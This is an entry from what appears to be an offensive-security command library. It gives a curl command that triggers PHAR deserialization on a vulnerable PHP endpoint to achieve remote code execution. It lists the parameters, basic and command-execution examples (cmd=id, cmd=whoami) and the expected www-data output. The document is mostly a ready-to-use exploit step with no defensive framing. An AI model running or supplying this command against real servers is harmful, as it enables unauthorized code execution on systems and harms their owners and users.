---
id: 3cce8f09-fd79-479b-895c-95e264852069
name: curl-trigger-phar-deserialization
type: command
executor: bash
data: 'curl "$_TARGET_VULN_URL?file=phar://uploads/$_PHAR_NAME/cmd=id"'
output: null
created_at: '2023-04-06T03:55:59.449568+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - rce
  - deserialization
  - phar
verified: true
validated: true
---

# curl-trigger-phar-deserialization

## Command

```bash
curl "$_TARGET_VULN_URL?file=phar://uploads/$_PHAR_NAME/cmd=id"
```

## Description

Sends an HTTP GET request to a vulnerable PHP endpoint, using the phar:// wrapper in a parameter to trigger deserialization of the uploaded PHAR archive's metadata, resulting in RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_VULN_URL | URL of the vulnerable deserialization endpoint (e.g., http://target.com/vuln.php) | Yes |
| $_PHAR_NAME | Name of the uploaded PHAR file on the server (e.g., exploit.phar) | Yes |
| ?file= | Query parameter name that controls the file path (adjust based on vuln, e.g., ?path= or ?image=) | Yes |
| phar:// | Stream wrapper to force PHAR processing and metadata deserialization | Built-in |
| /cmd=id | Optional path to internal file and command for execution (if gadget supports) | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/vuln.php?file=phar://uploads/exploit.phar"
```

### Advanced Usage (with command execution)

```bash
curl "http://target.com/vuln.php?file=phar://uploads/exploit.phar/cmd=whoami"
```

## Expected Output

uid=33(www-data) gid=33(www-data) groups=33(www-data)
(or output from the executed command in the gadget chain).

## Related

- [[procedures/Phar-Deserialization-Attack]]
- [[commands/curl-upload-phar-to-target]]
